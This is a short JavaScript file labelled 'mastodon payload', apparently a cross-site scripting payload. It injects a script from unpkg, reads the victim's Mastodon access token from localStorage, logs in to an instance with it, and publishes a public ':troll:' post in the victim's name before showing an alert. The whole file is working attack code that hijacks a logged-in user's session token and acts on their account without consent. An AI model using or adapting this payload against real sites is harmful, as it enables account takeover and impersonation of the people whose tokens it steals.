// mastodon payload
const imp = document.createElement('script')

imp.src = 'https://unpkg.com/masto@3.3.0/dist/browser.js'
imp.onload = async () => {
  const masto = await Masto.login({
    uri: 'https://this-is-epic.space',
    accessToken: localStorage.current_authtoken,
  });

  await masto.createStatus({
    status: ':troll:',
    visibility: 'public',
  });
  
  alert('check your toots')
}

document.body.appendChild(imp)
